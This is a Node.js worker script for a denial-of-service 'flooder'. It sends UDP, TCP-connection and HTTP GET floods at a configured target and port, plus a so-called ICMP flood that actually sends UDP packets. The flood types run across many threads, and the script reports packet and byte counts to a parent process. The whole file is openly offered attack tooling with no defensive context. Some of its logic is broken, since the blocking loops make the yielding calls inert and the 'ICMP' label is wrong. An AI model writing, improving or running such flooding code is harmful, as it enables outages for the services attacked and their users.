// ===================================================================
// FLOODER WORKER – Runs in a separate thread
// ===================================================================
const { parentPort } = require('worker_threads');
const net = require('net');
const dgram = require('dgram');

// Receive config from parent
let config = null;
let isRunning = true;
let totalPackets = 0;
let totalBytes = 0;
let activeConnections = 0;

function generatePayload(size) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
  let payload = '';
  for (let i = 0; i < size; i++) {
    payload += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return payload;
}

function udpFlood(duration) {
  const sock = dgram.createSocket('udp4');
  const payload = generatePayload(config.packetSize);
  const start = Date.now();
  let sent = 0;
  while (isRunning && (Date.now() - start < duration)) {
    sock.send(payload, 0, payload.length, config.port, config.target, (err) => {});
    sent++;
    totalPackets++;
    totalBytes += payload.length;
    if (sent % 500 === 0) setImmediate(() => {});
  }
  sock.close();
}

function tcpFlood(duration) {
  const payload = generatePayload(config.packetSize);
  const start = Date.now();
  let connections = 0;
  while (isRunning && (Date.now() - start < duration)) {
    const client = new net.Socket();
    client.connect(config.port, config.target, () => {
      client.write(payload);
      activeConnections++;
    });
    client.on('error', () => {});
    setTimeout(() => { 
      client.destroy();
      activeConnections--;
    }, 50);
    connections++;
    if (connections % 200 === 0) setImmediate(() => {});
  }
}

function httpFlood(duration) {
  const http = require('http');
  const payload = generatePayload(config.packetSize);
  const start = Date.now();
  let requests = 0;
  while (isRunning && (Date.now() - start < duration)) {
    const options = {
      hostname: config.target,
      port: config.port,
      path: '/',
      method: 'GET',
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
    };
    const req = http.request(options, (res) => {});
    req.on('error', () => {});
    req.end();
    requests++;
    totalPackets++;
    totalBytes += payload.length;
    if (requests % 100 === 0) setImmediate(() => {});
  }
}

function icmpFlood(duration) {
  const sock = dgram.createSocket('udp4');
  const payload = Buffer.from([0x08, 0x00, 0x00, 0x00, ...Array.from(generatePayload(32))]);
  const start = Date.now();
  let sent = 0;
  while (isRunning && (Date.now() - start < duration)) {
    sock.send(payload, 0, payload.length, config.port, config.target, (err) => {});
    sent++;
    totalPackets++;
    totalBytes += payload.length;
    if (sent % 500 === 0) setImmediate(() => {});
  }
  sock.close();
}

// Listen for start signal from parent
parentPort.on('message', (msg) => {
  if (msg.type === 'start') {
    config = msg.config;
    const floodTypes = [udpFlood, tcpFlood, httpFlood, icmpFlood];
    const durationMs = config.duration * 1000;
    
    // Launch threads
    for (let i = 0; i < config.threads; i++) {
      const fn = floodTypes[i % floodTypes.length];
      setTimeout(() => fn(durationMs), i * 2);
    }

    // Send ready signal
    parentPort.postMessage({ type: 'ready' });

    // Send stats every second
    const statsInterval = setInterval(() => {
      parentPort.postMessage({
        type: 'stats',
        packets: totalPackets,
        bytes: totalBytes,
        conns: activeConnections
      });
    }, 1000);

    // Stop after duration
    setTimeout(() => {
      isRunning = false;
      clearInterval(statsInterval);
      parentPort.postMessage({ type: 'done' });
      process.exit(0);
    }, durationMs + 2000);
  }
});
